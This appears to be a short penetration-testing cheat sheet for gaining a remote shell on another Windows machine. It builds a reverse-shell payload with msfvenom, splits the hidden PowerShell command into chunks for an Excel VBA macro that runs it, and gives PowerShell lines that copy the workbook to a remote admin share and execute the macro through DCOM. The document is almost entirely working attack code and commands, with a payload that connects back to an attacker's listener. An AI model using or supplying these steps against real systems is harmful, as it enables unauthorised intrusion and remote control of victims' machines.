# Build Payload
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=443 -f hta-psh -o evil.hta

#Copy out "powershell.exe -nop -w hidden -e blah blah put into payload_MacroSplit.py script"
########################################################################
#!/usr/bin/env python3

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.222 LPORT=443 EXITFUNC=thread -f hta-psh

str = "powershell.exe -nop -w hidden -e aQBmAC...."

n = 50

for x in range(0, len(str), n):
    split = str[x:x+n]
    print(f'Str = Str + "{split}"')
##########################################################################


# Insert Macro w/ split payload
Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
    ...
    Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
    Shell (Str)
End Sub


# Move the file to where it is needed
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")